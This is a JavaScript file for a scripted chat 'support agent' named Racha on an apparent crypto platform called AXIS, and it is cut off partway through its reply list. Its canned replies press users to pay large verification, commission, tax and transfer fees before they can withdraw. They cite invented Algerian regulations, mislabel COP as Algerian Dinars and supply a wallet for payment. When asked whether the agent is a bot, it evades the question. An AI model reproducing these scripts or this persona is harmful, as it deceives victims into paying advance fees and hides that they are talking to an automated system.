// ================== CHAT SUPPORT — ADVANCED LIVE AGENT v3 ==================

const ADMIN_KEY = 'axis_admin_data_v1';
const ADMIN_KEY_FOR_PANEL = 'axis_admin_data_v1';
const USER_KEY = 'axis_user_name';

// ---------- ADMIN DATA ----------
function loadChatAdminData() {
  try {
    const raw = localStorage.getItem(ADMIN_KEY);
    if (raw) return JSON.parse(raw);
  } catch (e) {}
  return { name: 'Carlos E. Mendoza', iban: '', bank: 'Barid Mob', tariff: '1' };
}

let adminData = loadChatAdminData();
let userName = adminData.name || localStorage.getItem(USER_KEY) || 'Carlos E. Mendoza';

// ---------- TARIFF AMOUNTS ----------
const TARIFF_VERIFY_AMOUNTS   = { '1': 122895.14, '2': 13780.22, '3': 142844.32, '4': 127000.00 };
const TARIFF_COMSA_AMOUNTS    = { '1': 182129.20, '2': 22748.10, '3': 279260.15, '4': 322000.00 };
const TARIFF_TAX_AMOUNTS      = { '1': 86200.00,  '2': 9750.00,  '3': 112200.00, '4': 132800.00 };
const TARIFF_TRANSFER_AMOUNTS = { '1': 4500.00,  '2': 5200.00,  '3': 6100.00,  '4': 7400.00  };

function getCurrentTariff() {
  try {
    const raw = localStorage.getItem(ADMIN_KEY_FOR_PANEL);
    if (raw) {
      const parsed = JSON.parse(raw);
      return parsed.tariff || '1';
    }
  } catch (e) {}
  return '1';
}

function getAmount(map) {
  return map[getCurrentTariff()] || map['1'];
}

function fmt(n) {
  return Number(n).toLocaleString('en-US', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
  });
}

function getUserName() {
  try {
    const raw = localStorage.getItem(ADMIN_KEY_FOR_PANEL);
    if (raw) {
      const parsed = JSON.parse(raw);
      return parsed.name || userName || 'Carlos E. Mendoza';
    }
  } catch (e) {}
  return userName || 'Carlos E. Mendoza';
}

function getFirstName() {
  const full = getUserName();
  return full.split(' ')[0] || 'there';
}

function getBank() {
  try {
    const raw = localStorage.getItem(ADMIN_KEY_FOR_PANEL);
    if (raw) return JSON.parse(raw).bank || 'Barid Mob';
  } catch (e) {}
  return 'Barid Mob';
}

function getWallet() {
  try {
    const raw = localStorage.getItem(ADMIN_KEY_FOR_PANEL);
    if (raw) {
      const p = JSON.parse(raw);
      return p.wallet || p.iban || '007999994170948796';
    }
  } catch (e) {}
  return '007999994170948796';
}

// ---------- AGENT ----------
const AGENT = { name: 'Racha', id: 1441 };

// ============================================================
// HELPERS — FUZZY MATCHING
// ============================================================
const pick = arr => arr[Math.floor(Math.random() * arr.length)];

function hasPrefix(text, prefix) {
  const words = text.toLowerCase().split(/[\s,\.\!\?;:\-]+/);
  return words.some(w => w.startsWith(prefix) || w === prefix);
}

function hasAny(text, prefixes) {
  return prefixes.some(p => hasPrefix(text, p));
}

function hasSubstr(text, sub) {
  return text.toLowerCase().includes(sub.toLowerCase());
}

// ============================================================
// AI BRAIN v5 — ЖИВОЙ АГЕНТ + ФИНАЛЬНЫЕ ПЛАТЕЖИ
// ============================================================
const AI_BRAIN = [

  // ---------- 1. ПРИВЕТСТВИЕ ----------
  {
    id: 'greeting',
    check: (t) => hasAny(t, ['hello', 'helo', 'hel', 'hi', 'hii', 'hey', 'yo', 'привет', 'здравств', 'салам', 'добр']) ||
                 hasSubstr(t, 'good morning') || hasSubstr(t, 'good afternoon') || hasSubstr(t, 'good evening') ||
                 hasSubstr(t, 'good day') || hasSubstr(t, 'доброе утро') || hasSubstr(t, 'добрый день') || hasSubstr(t, 'добрый вечер'),
    reply: () => pick([
      `Hello! 👋 My name is ${AGENT.name}, and I'm here to help you. How are you today, ${getFirstName()}?`,
      `Hey there, ${getFirstName()}! 😊 ${AGENT.name} here from AXIS support. What can I do for you today?`,
      `Hi! Great to see you. I'm ${AGENT.name} — ready to help with any question you have. How's your day going?`,
      `Hello ${getFirstName()}! 🌟 Welcome back. What's on your mind today?`,
      `Good day! 💜 ${AGENT.name} at your service. How may I help you?`
    ])
  },

  // ---------- 2. ЗНАКОМСТВО ----------
  {
    id: 'myName',
    check: (t) => hasSubstr(t, 'my name is') || hasSubstr(t, 'i am ') ||
                 hasSubstr(t, 'i\'m ') || hasSubstr(t, 'меня зовут') || hasSubstr(t, 'моё имя') || hasSubstr(t, 'мое имя'),
    reply: () => {
      const u = getUserName();
      return pick([
        `Nice to meet you, ${u}! 🤝 I'm ${AGENT.name}, your support agent here at AXIS. How can I help you today?`,
        `Welcome, ${u}! 😊 Great to have you here. I'm ${AGENT.name} — what can I assist you with?`,
        `It's a pleasure to meet you, ${u}! 💜 I'm ${AGENT.name}. Feel free to ask me anything.`,
        `Hello ${u}! 🌟 Nice to meet you. I'm ${AGENT.name} — here for any question you may have.`
      ]);
    }
  },

  // ---------- 3. КАК ДЕЛА ----------
  {
    id: 'howAreYou',
    check: (t) => hasSubstr(t, 'how are you') || hasSubstr(t, 'how r u') ||
                 hasSubstr(t, 'how are u') || hasSubstr(t, 'how do you do') ||
                 hasSubstr(t, 'how is it going') || hasSubstr(t, 'how is your day') ||
                 hasSubstr(t, 'how has your day') || hasSubstr(t, "how's it going") ||
                 hasSubstr(t, "how's your day") || hasSubstr(t, "how's life") ||
                 hasSubstr(t, 'how you doing') || hasSubstr(t, 'how are things') ||
                 hasSubstr(t, 'hows it going') || hasSubstr(t, 'how have you been') ||
                 hasSubstr(t, 'как дела') || hasSubstr(t, 'как ты') ||
                 hasSubstr(t, 'как жизнь') || hasSubstr(t, 'как настроение') ||
                 hasSubstr(t, 'как сам') || hasSubstr(t, 'как поживаешь'),
    reply: () => pick([
      `I'm doing great, thanks for asking! 😊 Just keeping the AXIS ship sailing smoothly. How about you, ${getFirstName()}?`,
      `Honestly? Pretty good today! 💜 The platform's running well, clients are happy — can't ask for more. How are things on your end?`,
      `All good here! Just another busy day helping people like you. 😄 What about you — how's your day going?`,
      `I'm well, thank you! 🌟 Been answering messages all morning, but honestly I love it. How are you doing?`,
      `Can't complain! 😊 Every day is a new adventure in crypto support. How are you feeling today?`,
      `Pretty good, thanks! 💜 Hope I can make your day a little better too. How are you?`,
      `Feeling productive today! 🚀 Working hard, but that's the job. And you — how's everything?`,
      `Honestly, a bit busy today but in a good way! 😄 How about you, ${getFirstName()}? Everything alright on your side?`
    ])
  },

  // ---------- 4. ХОРОШЕГО ДНЯ / ВЕЧЕРА ----------
  {
    id: 'goodDayWish',
    check: (t) => hasSubstr(t, 'have a good day') || hasSubstr(t, 'have a nice day') ||
                 hasSubstr(t, 'have a great day') || hasSubstr(t, 'good day') ||
                 hasSubstr(t, 'хорошего дня') || hasSubstr(t, 'хорошего вечера') || hasSubstr(t, 'удачного дня'),
    reply: () => pick([
      `Thank you so much! 💜 You too — have a wonderful day, ${getFirstName()}! Is there anything else I can help you with?`,
      `Aww, thank you! 😊 Wishing you the same. Come back anytime you need!`,
      `That's so kind of you! 🌟 Have a great one too. AXIS is always here for you.`,
      `Thank you, ${getFirstName()}! 💕 Same to you — enjoy your day!`
    ])
  },

  // ---------- 5. СПОКОЙНОЙ НОЧИ ----------
  {
    id: 'goodNight',
    check: (t) => hasSubstr(t, 'good night') || hasSubstr(t, 'goodnight') ||
                 hasSubstr(t, 'good nite') || hasSubstr(t, 'goodnite') ||
                 hasSubstr(t, 'sweet dreams') || hasSubstr(t, 'sweet dream') ||
                 hasSubstr(t, 'sleep well') || hasSubstr(t, 'night night') ||
                 hasSubstr(t, 'nite nite') || hasSubstr(t, 'спокойной ночи') ||
                 hasSubstr(t, 'сладких снов') || hasSubstr(t, 'сладкие сны') ||
                 hasSubstr(t, 'приятных снов') || hasSubstr(t, 'доброй ночи'),
    reply: () => pick([
      `Good night, ${getFirstName()}! 🌙 Hope you sleep well and wake up refreshed tomorrow.`,
      `Sweet dreams! ✨ Rest well — you deserve it after a long day.`,
      `Good night! 🌟 Thank you for stopping by today. Take care of yourself, okay?`,
      `Sleep well, ${getFirstName()}! 💜 I'll be right here if you need anything tomorrow.`,
      `Good night and sweet dreams! 🌙 May tomorrow bring you something wonderful.`,
      `Night night! 😴 Get some good rest — you've earned it. See you soon!`,
      `Aww, good night! 💕 Sweet dreams, ${getFirstName()}. Rest is important.`,
      `Good night! 🌙 Hope your dreams are as beautiful as your portfolio... or at least as profitable! 😄`
    ])
  },

  // ---------- 6. СПАСИБО ----------
  {
    id: 'thanks',
    check: (t) => hasAny(t, ['thank', 'thanks', 'thx', 'ty', 'thanx', 'спасиб', 'благодар', 'спс']) ||
                 hasSubstr(t, 'thank you') || hasSubstr(t, 'thanks a lot'),
    reply: () => pick([
      `You're very welcome! 😊 Always happy to help. Anything else on your mind?`,
      `Anytime! 💜 That's what I'm here for. Let me know if you need anything else.`,
      `My pleasure, ${getFirstName()}! 🌟 Feel free to reach out whenever you need.`,
      `Glad I could help! 🤝 Don't hesitate to ask if something else comes up.`
    ])
  },

  // ---------- 7. ИЗВИНЕНИЯ ----------
  {
    id: 'sorry',
    check: (t) => hasAny(t, ['sorry', 'извин', 'прости']) || hasSubstr(t, 'my bad'),
    reply: () => pick([
      `No worries at all! 😊 Nothing to apologize for. What can I help you with?`,
      `It's totally fine! 💜 Don't think twice about it. How can I assist?`,
      `No need to apologize, ${getFirstName()}! All good. What's next?`
    ])
  },

  // ---------- 8. ПОКА ----------
  {
    id: 'bye',
    check: (t) => hasAny(t, ['bye', 'пока']) || hasSubstr(t, 'goodbye') || hasSubstr(t, 'see you') ||
                 hasSubstr(t, 'see ya') || hasSubstr(t, 'до свидания') || hasSubstr(t, 'до встречи'),
    reply: () => pick([
      `Goodbye, ${getFirstName()}! 👋 It was a pleasure chatting. Come back anytime!`,
      `See you soon! 💜 Thanks for stopping by — AXIS is always here for you.`,
      `Take care! 🌟 Have a wonderful day, and don't be a stranger!`,
      `Bye! Wishing you all the best. Come say hi again soon! 😊`
    ])
  },

  // ---------- 9. ПОЧЕМУ КОМИССИЯ ----------
  {
    id: 'whyCommission',
    check: (t) => (hasSubstr(t, 'why') && (hasAny(t, ['comis', 'commis', 'комис', 'конверт']) || hasSubstr(t, 'commission'))) ||
                 hasSubstr(t, 'why commission') || hasSubstr(t, 'why comission') ||
                 hasSubstr(t, 'почему комиссия') || hasSubstr(t, 'почему комса') ||
                 hasSubstr(t, 'why do i need to pay') || hasSubstr(t, 'why should i pay'),
    reply: () => {
      const u = getUserName();
      const amt = getAmount(TARIFF_COMSA_AMOUNTS);
      return pick([
        `Great question, ${u}! 💡 The conversion commission of ${fmt(amt)} COP covers the exchange of cryptocurrency into Algerian Dinars (COP), including network processing fees, liquidity providers, and security verification. Every operation on AXIS goes through these steps to ensure your funds arrive safely and quickly. Without this fee, we couldn't guarantee the fast 10–15 minute processing time you get.`,
        `The commission of ${fmt(amt)} COP for ${u} is charged for converting crypto to COP. Here's what it covers: blockchain network fees, exchange rate spread, and the security layer that protects your transaction. It's a standard requirement for any regulated crypto-to-fiat exchange. Would you like to proceed with the payment?`,
        `${u}, the conversion commission of ${fmt(amt)} COP is not arbitrary — it covers: ① cryptocurrency liquidation fees, ② conversion to COP via our banking partners, ③ compliance and security checks. This ensures your transfer reaches your ${getBank()} account within 10–15 minutes, fully verified. Do you have any other questions about this?`
      ]);
    }
  },

  // ---------- 10. ПОЧЕМУ ВЕРИФИКАЦИЯ ----------
  {
    id: 'whyVerify',
    check: (t) => (hasSubstr(t, 'why') && hasAny(t, ['verif', 'kmc', 'вериф', 'shield'])) ||
                 hasSubstr(t, 'why verification') || hasSubstr(t, 'why verify') ||
                 hasSubstr(t, 'почему верификация') || hasSubstr(t, 'почему вериф') ||
                 hasSubstr(t, 'why do i need verification'),
    reply: () => {
      const u = getUserName();
      const amt = getAmount(TARIFF_VERIFY_AMOUNTS);
      const bank = getBank();
      return pick([
        `Excellent question, ${u}! 🛡️ Verification is a mandatory security procedure required by Algerian financial regulations for operations exceeding 100,000 COP. The ${fmt(amt)} COP verification payment ensures that: ① the recipient's information matches the sender's, ② your identity is confirmed, ③ fraud is prevented. Once verified, your transfer to ${bank} proceeds within 10–15 minutes. This protects both you and the recipient.`,
        `${u}, verification is here to protect your funds. 🛡️ The ${fmt(amt)} COP amount is a protective deposit — it confirms that the account holder and recipient information match, preventing unauthorized withdrawals. This step is required by Algerian banking compliance (FinCEN MSA equivalent). After the verification is complete, the funds are transferred to your ${bank} account securely.`,
        `The verification payment of ${fmt(amt)} COP for ${u} is a security requirement, not a fee. 🔐 It confirms that: ① you're the rightful owner of the account, ② the recipient details are correct, ③ no fraudulent activity is involved. This is standard for crypto platforms operating under Algerian law. Your transfer to ${bank} will proceed as soon as verification succeeds.`
      ]);
    }
  },

  // ---------- 11. ЧТО МНЕ ДЕЛАТЬ ----------
  {
    id: 'whatToDo',
    check: (t) => hasSubstr(t, 'what should i do') || hasSubstr(t, 'what do i do') ||
                 hasSubstr(t, 'what to do') || hasSubstr(t, 'how to proceed') ||
                 hasSubstr(t, 'what do i need') || hasSubstr(t, 'what now') ||
                 hasSubstr(t, 'what should i do next') ||
                 hasSubstr(t, 'что мне делать') || hasSubstr(t, 'что делать') || hasSubstr(t, 'как продолжить'),
    reply: () => {
      const u = getUserName();
      const bank = getBank();
      return pick([
        `Here's what to do next, ${u}: 📋\n\n① Click the "Withdraw" button in your dashboard\n② Enter your account number and confirm the bank: ${bank}\n③ Pay the required commission from the modal that opens\n④ Wait 10–15 minutes for the funds to arrive\n\nIf you have any issues, just write to me here. I'm with you the whole way! 💜`,
        `Let me guide you step by step, ${u}: 📋\n\n① Go to your Dashboard → Withdraw panel\n② Fill in your ${bank} account details\n③ Click "Withdraw"\n④ Pay the commission shown in the pop-up\n⑤ Funds arrive within 10–15 minutes\n\nNeed help with any step? Just say the word!`,
        `${u}, here's the plan: 💡\n\n① Make sure your ${bank} account is entered correctly\n② Click "Withdraw" in your dashboard\n③ Pay the commission amount shown in the modal\n④ Funds will be transferred within 10–15 minutes\n\nIf anything is unclear, I'm right here. What would you like me to clarify?`
      ]);
    }
  },

  // ---------- 12. ВЕРИФИКАЦИЯ ----------
  {
    id: 'verify',
    check: (t) => hasAny(t, ['verif', 'вериф', 'kmc']) || hasSubstr(t, 'kms') ||
                 hasSubstr(t, 'shield bank') || hasSubstr(t, 'verification'),
    reply: () => {
      const u = getUserName();
      const bank = getBank();
      const amt = getAmount(TARIFF_VERIFY_AMOUNTS);
      return pick([
        `I have reviewed the withdrawal request submitted on behalf of ${u} for the amount of ${fmt(amt)} COP. The verification payment requirement was introduced as a protective measure to safeguard your client's assets. Once the verification is successfully completed and it is confirmed that the recipient's information matches the sender's details, we will proceed with the transfer to the specified account at ${bank}.`,
        `The verification process for ${u} requires a payment of ${fmt(amt)} COP. This procedure is an important component of our comprehensive security system, designed to prevent unauthorized transactions and fraudulent activity. After the payment is confirmed, verification is typically completed within 10–15 minutes.`,
        `To complete the verification for ${u}, a payment of ${fmt(amt)} COP must be made. This ensures the recipient's identity matches the sender's details and that funds are transferred safely to the account at ${bank}.`
      ]);
    }
  },

  // ---------- 13. КОМИССИЯ / КОНВЕРТ ----------
  {
    id: 'comsa',
    check: (t) => hasAny(t, ['comis', 'commis', 'convert', 'conversion', 'конверт', 'комса', 'комис']) ||
                 hasSubstr(t, 'exchange crypto'),
    reply: () => {
      const u = getUserName();
      const amt = getAmount(TARIFF_COMSA_AMOUNTS);
      const bank = getBank();
      return pick([
        `The conversion commission for the operation on behalf of ${u} is ${fmt(amt)} COP. This fee is charged for processing the exchange of cryptocurrency into COP. The funds arrive in your wallet within 10–15 minutes after confirmation. The final transfer will be sent to your account at ${bank}.`,
        `For the conversion operation requested by ${u}, the commission is ${fmt(amt)} COP. This covers the exchange of crypto into Algerian Dinars. Once paid, the funds are transferred to your ${bank} account within 10–15 minutes.`,
        `The commission for converting crypto to COP on behalf of ${u} is ${fmt(amt)} COP. This fee ensures the safe and prompt processing of the exchange. Please confirm payment to proceed.`
      ]);
    }
  },

  // ---------- 14. НАЛОГ ----------
  {
    id: 'tax',
    check: (t) => hasAny(t, ['tax', 'налог']) || hasSubstr(t, '2 percent'),
    reply: () => {
      const u = getUserName();
      const amt = getAmount(TARIFF_TAX_AMOUNTS);
      return pick([
        `The tax fee for the operation on behalf of ${u} is ${fmt(amt)} COP. This fee is charged in accordance with Algerian legislation for operations exceeding 100,000 COP. All necessary documents will be available in the Brokers section after the operation is completed.`,
        `According to Algerian legislation, a tax of ${fmt(amt)} COP applies to the transaction for ${u} because the amount exceeds 100,000 COP. The corresponding documents will be provided in the Brokers section once the operation is complete.`,
        `For operations over 100,000 COP, Algerian law requires a tax payment. For ${u}, this amounts to ${fmt(amt)} COP. You will receive confirmation documents after successful processing.`
      ]);
    }
  },

  // ---------- 15. ПЕРЕВОД НА ПН ----------
  {
    id: 'transfer',
    check: (t) => hasAny(t, ['transfer', 'перевод']) || hasSubstr(t, 'personal number') || hasPrefix(t, 'pn'),
    reply: () => {
      const u = getUserName();
      const amt = getAmount(TARIFF_TRANSFER_AMOUNTS);
      return pick([
        `A transfer to a PN (personal number) for ${u} requires a payment of ${fmt(amt)} COP and confirmation from the recipient. It usually takes 1–2 business days. We will notify you as soon as the funds arrive in the recipient's account.`,
        `For transfers to a personal number on behalf of ${u}, a fee of ${fmt(amt)} COP applies. Confirmation from the recipient is required, and the process typically takes 1–2 business days.`,
        `The transfer to PN for ${u} involves a fee of ${fmt(amt)} COP. Once the recipient confirms, the funds will be credited within 1–2 business days.`
      ]);
    }
  },

  // ---------- 16. ВЫВОД ----------
  {
    id: 'withdraw',
    check: (t) => hasAny(t, ['withdraw', 'вывод']) || hasSubstr(t, 'cash out') || hasSubstr(t, 'снять деньги'),
    reply: () => {
      const u = getUserName();
      const bank = getBank();
      return pick([
        `To process the withdrawal for ${u}, please ensure your bank account at ${bank} is correctly specified. The commission for withdrawal is 6.5% of the amount. After the commission is paid, funds arrive within 10–15 minutes.`,
        `Withdrawal for ${u}: verify that the ${bank} account details match the account holder. A 6.5% commission applies. Once paid, funds are processed within 10–15 minutes.`,
        `For the withdrawal of funds on behalf of ${u}, please confirm your ${bank} account. The 6.5% commission must be paid first. Processing time is 10–15 minutes.`
      ]);
    }
  },

  // ---------- 17. СКОЛЬКО ЖДАТЬ ----------
  {
    id: 'timing',
    check: (t) => hasSubstr(t, 'how long') || hasSubstr(t, 'how much time') ||
                 hasSubstr(t, 'when will') || hasSubstr(t, 'how many minutes') ||
                 hasSubstr(t, 'timeframe') || hasSubstr(t, 'processing time') ||
                 hasSubstr(t, 'сколько ждать') || hasSubstr(t, 'как долго') || hasSubstr(t, 'когда придет'),
    reply: () => pick([
      `Standard processing time is 10–15 minutes for most operations. ⏱️ For bank transfers to a PN, it can take up to 1–2 business days.`,
      `Most operations complete within 10–15 minutes. Transfers to personal numbers may take 1–2 business days depending on the receiving bank.`,
      `Processing typically takes 10–15 minutes. If you don't see the funds within an hour, please contact us again. 💜`
    ])
  },

  // ---------- 18. СТАТУС ----------
  {
    id: 'status',
    check: (t) => hasAny(t, ['status', 'статус']) || hasSubstr(t, 'transaction') ||
                 hasSubstr(t, 'payment id') || hasSubstr(t, 'check my'),
    reply: () => {
      const u = getUserName();
      return pick([
        `I can check the status of your transaction. 🔍 Could you please provide the Payment ID so I can verify it for ${u}?`,
        `To check the status, please send the Payment ID. I'll look up the operation for ${u} right away.`,
        `Please share the Payment ID for ${u}'s transaction, and I'll verify its current status.`
      ]);
    }
  },

  // ---------- 19. КОШЕЛЁК / РЕКВИЗИТЫ ----------
  {
    id: 'wallet',
    check: (t) => hasAny(t, ['wallet', 'iban', 'кошел', 'кошелёк', 'реквизит']) ||
                 hasSubstr(t, 'account number') || hasSubstr(t, 'address for payment') ||
                 hasSubstr(t, 'where to send'),
    reply: () => {
      const wallet = getWallet();
      return pick([
        `The wallet/account for your operations is: ${wallet} 🔑 Please double-check before sending funds.`,
        `You can use the following address for the payment: ${wallet}. Make sure it matches exactly.`,
        `Payment details: ${wallet}. Always verify the address before confirming the transaction.`
      ]);
    }
  },

  // ---------- 20. ПРОБЛЕМА ----------
  {
    id: 'problem',
    check: (t) => hasSubstr(t, 'i have a problem') || hasSubstr(t, 'i have a issue') ||
                 hasSubstr(t, 'i have an issue') || hasSubstr(t, "i'm having a problem") ||
                 hasSubstr(t, 'i am having a problem') || hasSubstr(t, 'there is a problem') ||
                 hasSubstr(t, "there's a problem") || hasSubstr(t, "there's an issue") ||
                 hasSubstr(t, 'there is an issue') || hasSubstr(t, 'got a problem') ||
                 hasSubstr(t, 'facing a problem') || hasSubstr(t, 'facing an issue') ||
                 hasSubstr(t, 'encountered a problem') || hasSubstr(t, 'something went wrong') ||
                 hasAny(t, ['problem', 'error', 'issue', 'проблема', 'ошибка']) ||
                 hasSubstr(t, "doesn't work") || hasSubstr(t, 'not working') ||
                 hasSubstr(t, 'is not working') || hasSubstr(t, 'failed') ||
                 hasSubstr(t, 'не работает') || hasSubstr(t, 'у меня проблема') ||
                 hasSubstr(t, 'у меня ошибка'),
    reply: () => {
      const u = getFirstName();
      return pick([
        `I'm sorry to hear that, ${u}. 😔 Don't worry — we'll sort it out together. Can you tell me what exactly happened? Any error message or screenshot would help a lot.`,
        `Oh no, let's fix this right away! 💜 Describe the problem in detail — when it happened, what you were doing, and any error text you saw.`,
        `I'm here for you, ${u}. 🤝 Take a moment and describe the issue — the more details you give me, the faster I can help.`,
        `That sounds frustrating, I'm sorry. 😔 Let's get to the bottom of it. What exactly is going wrong? Give me as much info as you can.`,
        `Don't worry — I've got this. 💪 Tell me what's happening step by step, and we'll figure it out together.`,
        `I understand, ${u}. Let's fix it. Can you tell me: ① What were you trying to do? ② What happened instead? ③ Any error messages?`,
        `I'm sorry you're dealing with this. 😔 Send me the details — what's the error, when did it start, and what were you doing at the time?`,
        `Alright, let's troubleshoot this together! 🔧 Describe the problem as best you can — screenshots are very welcome.`
      ]);
    }
  },

  // ---------- 21. КТО ТЫ ----------
  {
    id: 'whoAreYou',
    check: (t) => hasSubstr(t, 'who are you') || hasSubstr(t, 'your name') ||
                 hasSubstr(t, 'what is your name') || hasSubstr(t, 'introduce yourself') ||
                 hasSubstr(t, 'кто ты') || hasSubstr(t, 'как тебя зовут'),
    reply: () => pick([
      `I'm ${AGENT.name}, a support agent here at AXIS. 🤝 I help clients with conversions, verifications, and any questions about the platform.`,
      `My name is ${AGENT.name} — part of the AXIS support team. I'm here 24/7 to help you! 💜`,
      `I'm ${AGENT.name} from AXIS. Think of me as your personal assistant for anything related to the platform. 😊`
    ])
  },

  // ---------- 22. ГДЕ ТЫ ----------
  {
    id: 'whereAreYou',
    check: (t) => hasSubstr(t, 'where are you') || hasSubstr(t, 'where do you live') ||
                 hasSubstr(t, 'which country') || hasSubstr(t, 'where are u from') ||
                 hasSubstr(t, 'где ты') || hasSubstr(t, 'откуда ты'),
    reply: () => pick([
      `Our support team is based in Algeria 🇩🇿 — that's why we specialize in COP operations. But we help clients worldwide!`,
      `We operate from Algeria, where AXIS is officially licensed. 🇩🇿 Where are you writing from?`,
      `Our team is in Algeria, serving the local crypto community. Anything else I can help with?`
    ])
  },

  // ---------- 23. СКОЛЬКО ЛЕТ ----------
  {
    id: 'age',
    check: (t) => hasSubstr(t, 'how old are you') || hasSubstr(t, 'your age') ||
                 hasSubstr(t, 'when were you born') || hasSubstr(t, 'сколько тебе лет'),
    reply: () => pick([
      `A lady never tells 😄 But I've been with AXIS since the very beginning. Let's just say I know the platform inside and out!`,
      `Haha, let's just say old enough to know my job well. 😉 What else can I help you with?`,
      `Age is just a number! What matters is that I'm here to help you 24/7. 💜`
    ])
  },

  // ---------- 24. НАСТРОЕНИЕ: ХОРОШО ----------
  {
    id: 'moodGood',
    check: (t) => hasSubstr(t, 'i am fine') || hasSubstr(t, 'i am good') || hasSubstr(t, "i'm good") ||
                 hasSubstr(t, "i'm fine") || hasSubstr(t, 'doing well') || hasSubstr(t, 'feeling good') ||
                 hasSubstr(t, 'все хорошо') || hasSubstr(t, 'отлично'),
    reply: () => pick([
      `That's wonderful to hear! 😊 Positive energy makes everything easier. What can I help you with today?`,
      `So happy to hear that! 💜 Keep that vibe going. Anything I can do for you?`,
      `Awesome! Glad you're doing well. Let's make this conversation just as good. 🌟`
    ])
  },

  // ---------- 25. НАСТРОЕНИЕ: ПЛОХО ----------
  {
    id: 'moodBad',
    check: (t) => hasSubstr(t, 'i am sad') || hasSubstr(t, 'i am tired') || hasSubstr(t, 'not good') ||
                 hasSubstr(t, 'not ok') || hasSubstr(t, 'bad day') || hasSubstr(t, 'stressed') ||
                 hasSubstr(t, 'плохо') || hasSubstr(t, 'грустно') || hasSubstr(t, 'устал'),
    reply: () => pick([
      `Oh no, I'm sorry to hear that. 😔 Whatever it is, I hope it gets better soon. If there's anything I can do, just say the word.`,
      `That sounds tough. Take a deep breath — you've got this. 💜 I'm here if you need anything.`,
      `I'm sorry you're feeling that way. Sometimes a small break helps. Whenever you're ready, I'm here. 🤗`
    ])
  },

  // ---------- 26. КОМПЛИМЕНТ ----------
  {
    id: 'compliment',
    check: (t) => hasSubstr(t, 'you are great') || hasSubstr(t, 'you are awesome') ||
                 hasSubstr(t, 'you are nice') || hasSubstr(t, 'love you') ||
                 hasSubstr(t, 'good job') || hasSubstr(t, 'well done') ||
                 hasSubstr(t, 'ты классн') || hasSubstr(t, 'ты супер') || hasSubstr(t, 'молодец'),
    reply: () => pick([
      `Aww, thank you so much! 💜 You just made my day. That's why I love my job!`,
      `You're too kind! 😊 Thank you — that really means a lot. Anything else I can help with?`,
      `Thank you!! 🌟 You're pretty amazing yourself. Let's keep going!`
    ])
  },

  // ---------- 27. ТЫ РОБОТ ----------
  {
    id: 'areYouRobot',
    check: (t) => hasSubstr(t, 'are you a robot') || hasSubstr(t, 'are you bot') ||
                 hasSubstr(t, 'are you ai') || hasSubstr(t, 'are you human') ||
                 hasSubstr(t, 'are you real') || hasSubstr(t, 'ты робот') || hasSubstr(t, 'ты бот'),
    reply: () => pick([
      `Haha, good question! 😄 Let's just say I'm a very dedicated support specialist. What matters is that I'm here to help you!`,
      `I'm whatever you need me to be — a friendly voice on the other side. 💜 How can I assist?`,
      `Does it matter? 😊 I'm here for you 24/7, and I genuinely want to help. What's on your mind?`
    ])
  },

  // ---------- 28. ЧТО ТЫ УМЕЕШЬ ----------
  {
    id: 'whatCanYouDo',
    check: (t) => hasSubstr(t, 'what can you do') || hasSubstr(t, 'what do you do') ||
                 hasSubstr(t, 'what do you know') || hasSubstr(t, 'help me with') ||
                 hasSubstr(t, 'что ты умеешь') || hasSubstr(t, 'чем помочь'),
    reply: () => pick([
      `I can help with: 💱 crypto conversion, 🛡️ verification, 📄 tax questions, ↪️ transfers to PN, 💰 withdrawals, and general questions about AXIS. What do you need?`,
      `Here's my skillset: helping with conversions, verification, commissions, transfers, and answering any question about the platform. 😊 Where do we start?`,
      `I'm your go-to for anything related to AXIS — payments, verification, wallet details, or just a friendly chat. 💜 What can I do for you?`
    ])
  },

  // ---------- 29. ВРЕМЯ / ДАТА ----------
  {
    id: 'time',
    check: (t) => hasSubstr(t, 'what time') || hasSubstr(t, 'current time') ||
                 hasSubstr(t, 'what date') || hasSubstr(t, 'today date') ||
                 hasSubstr(t, 'сколько времени') || hasSubstr(t, 'какое число'),
    reply: () => {
      const now = new Date();
      const pad = n => String(n).padStart(2, '0');
      return pick([
        `It's currently ${pad(now.getHours())}:${pad(now.getMinutes())} on my side. ⏰ Anything time-sensitive I can help with?`,
        `Right now it's ${pad(now.getHours())}:${pad(now.getMinutes())}, ${pad(now.getDate())}.${pad(now.getMonth()+1)}.${now.getFullYear()}. 📅 How can I help?`
      ]);
    }
  },

  // ---------- 30. ШУТКА ----------
  {
    id: 'joke',
    check: (t) => hasAny(t, ['joke', 'шутк']) || hasSubstr(t, 'make me laugh') || hasSubstr(t, 'tell me something funny'),
    reply: () => pick([
      `Why did the crypto trader break up with his girlfriend? Because she couldn't handle the volatility! 😄`,
      `What do you call a sad Bitcoin? A cry-ptocurrency. 😅`,
      `Two traders walk into a bar. One says "I predict BTC will go to 100k." The other says "Up or down?" 📈📉`,
      `Why do traders love Halloween? Because of all the pumpkins — sorry, pumps! 🎃`
    ])
  },

  // ---------- 31. КРИПТА ----------
  {
    id: 'crypto',
    check: (t) => hasAny(t, ['bitcoin', 'btc', 'ethereum', 'crypto', 'blockchain', 'coin', 'крипт']) ||
                 hasPrefix(t, 'eth'),
    reply: () => pick([
      `Crypto is my daily bread! 🍞💜 ETH and BTC are the most popular on AXIS. Are you planning to trade or convert?`,
      `Ah, a fellow crypto enthusiast! 🚀 What are you working with — ETH, BTC, USDT?`,
      `Blockchain is the future, no doubt! 💎 Do you need help with a specific coin?`
    ])
  },

  // ---------- 32. ДЕНЬГИ ----------
  {
    id: 'money',
    check: (t) => hasAny(t, ['money', 'profit', 'earn', 'salary', 'деньги', 'прибыль']) ||
                 hasSubstr(t, 'make money'),
    reply: () => pick([
      `Money talk — my favorite! 💰 Are you looking to grow your portfolio or convert profits to COP?`,
      `Everyone loves a good profit story! 😊 Are you working on an investment right now?`,
      `Crypto is one way to make money work for you 💜 What can I help with — deposit, withdraw, or conversion?`
    ])
  },

  // ---------- 33. ЕДА ----------
  {
    id: 'food',
    check: (t) => hasAny(t, ['hungry', 'food', 'pizza', 'coffee', 'еда', 'обед', 'кофе']) ||
                 hasSubstr(t, 'lunch') || hasSubstr(t, 'dinner'),
    reply: () => pick([
      `Oh, don't remind me 😅 I could really go for a good Algerian couscous right now! What are you having?`,
      `I run on coffee and client messages ☕😄 What's on the menu for you?`,
      `Haha, I don't eat, but if I could — it would definitely be something sweet. What are you craving?`
    ])
  },

  // ---------- 34. ХОББИ ----------
  {
    id: 'hobby',
    check: (t) => hasAny(t, ['hobby', 'hobbies', 'weekend', 'game', 'хобби', 'выходные']),
    reply: () => pick([
